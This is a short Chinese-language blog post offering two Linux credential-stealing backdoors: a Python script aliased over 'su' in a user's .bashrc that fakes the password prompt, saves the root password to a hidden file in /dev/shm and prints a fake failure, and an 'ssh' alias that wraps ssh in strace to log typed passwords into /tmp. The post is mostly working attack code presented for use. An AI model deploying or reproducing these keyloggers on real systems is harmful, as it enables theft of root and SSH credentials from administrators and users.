---
layout:     post
title:      "Keyboard Logger On Linux - Part 1"
subtitle:   "Serial"
date:       2016-12-23
author:     "Urahara"
header-img: "img/05f7a6edc6d63e4f97353f87fbb3d18d.jpg"
header-mask: 0.3
tags:
    - Keyboard Logger
    - Backdoor 



---

### alias su keylogger

在一个低权限用户目录下的.bashrc添加一句alias su='/usr/root.py'，低权限用户su root后成功记录密码，但使用这种方法后管理员无法正常su切换至root用户下，所以比较容易被管理员发现。密码记录路径请看脚本。 

```python
#!/usr/bin/python
# -*- coding: cp936 -*-

import os, sys, getpass, time

current_time = time.strftime("%Y-%m-%d %H:%M")
logfile="/dev/shm/.su.log"              //密码获取后记录在这里
#CentOS                 
#fail_str = "su: incorrect password"
#Ubuntu              
#fail_str = "su: Authentication failure"
#For Linux Korea                    //centos,ubuntu,korea 切换root用户失败提示不一样
fail_str = "su: incorrect password"
try:
	passwd = getpass.getpass(prompt='Password: ');
	file=open(logfile,'a')
	file.write("[%s]t%s"%(passwd, current_time))   //截取root密码
	file.write('n')
	file.close()
except:
	pass
time.sleep(1)
print fail_str                               //打印切换root失败提示
```

### alias ssh keylogger

同样编辑当前用户下的.bashrc文件,添加以下内容，然后使用source .bashrc 命令使配置生效，当ssh的时候,就会在tmp下面生成记录

```basic
alias ssh='strace -o /tmp/sshpwd-`date    '+%d%h%m%s'`.log -e read,write,connect  -s2048 ssh' 
```

